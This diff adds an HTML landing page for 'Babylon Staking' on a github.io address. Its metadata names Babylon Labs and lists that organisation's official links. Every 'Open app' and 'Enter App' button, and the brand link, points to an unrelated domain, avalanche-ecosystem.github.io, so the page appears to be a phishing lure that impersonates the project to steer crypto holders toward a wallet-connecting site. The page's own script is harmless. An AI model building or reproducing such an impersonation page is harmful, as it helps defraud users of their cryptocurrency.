@@ -1,1 +1,124 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Babylon Staking</title>
+  <meta name="description" content="Babylon Staking lets you stake native BTC via Babylon from your own wallet with no yield promises.">
+  <link rel="canonical" href="https://babylon-staking.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#090A0F">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Babylon Staking">
+  <meta property="og:description" content="Babylon Staking lets you stake native BTC via Babylon from your own wallet with no yield promises.">
+  <meta property="og:url" content="https://babylon-staking.github.io/">
+  <meta property="og:image" content="https://babylon-staking.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Babylon Staking">
+  <meta name="twitter:description" content="Babylon Staking lets you stake native BTC via Babylon from your own wallet with no yield promises.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://babylon-staking.github.io/#website",
+        "url": "https://babylon-staking.github.io/",
+        "name": "Babylon Staking",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://babylon-staking.github.io/#organization",
+        "name": "Babylon Labs",
+        "url": "https://babylonlabs.io/",
+        "sameAs": [
+          "https://babylonlabs.io/",
+          "https://github.com/babylonlabs-io",
+          "https://x.com/babylonlabs_io",
+          "https://www.linkedin.com/company/babylon-labs-official",
+          "https://forum.babylon.foundation/"
+        ]
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://babylon-staking.github.io/#app",
+        "name": "Babylon Staking",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://babylon-staking.github.io/",
+        "description": "Babylon Staking lets you stake native BTC via Babylon from your own wallet with no yield promises.",
+        "creator": { "@id": "https://babylon-staking.github.io/#organization" }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Babylon Staking">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>Babylon</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://mempool.space/" target="_blank" rel="nofollow noopener noreferrer">Mempool</a>
+      <a href="https://www.coingecko.com/en/coins/babylon" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://babylonlabs.io/" target="_blank" rel="nofollow noopener noreferrer">Babylon</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
 
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Babylon Staking</h1>
+      <p class="sub"><strong>Babylon Staking</strong> lets you stake native BTC via Babylon from your own wallet with no yield promises.</p>
+    </section>
+
+    <section class="card" aria-label="Native BTC staking preview">
+      <div class="card-head">
+        <span class="eyebrow">Stake</span>
+        <span class="status" data-state>Native BTC</span>
+      </div>
+      <div class="stake-flow">
+        <div class="leg">
+          <span class="label">Asset</span>
+          <span class="chip">
+            <img class="icon" src="btc.png" width="30" height="30" alt="BTC">
+            <span class="chip-text">BTC</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch staking preview">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">Destination</span>
+          <span class="destination">Babylon</span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+      <p class="note">Preview only. Confirm wallet actions and terms in the app.</p>
+    </section>
+  </main>
+
+  <footer class="footer"><b>Babylon Staking</b> &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    var state = document.querySelector("[data-state]");
+    var card = document.querySelector(".card");
+    if (!button || !state || !card) return;
+    button.addEventListener("click", function(){
+      card.classList.toggle("is-review");
+      state.textContent = card.classList.contains("is-review") ? "Wallet preview" : "Native BTC";
+    });
+  })();
+  </script>
+</body>
+</html>
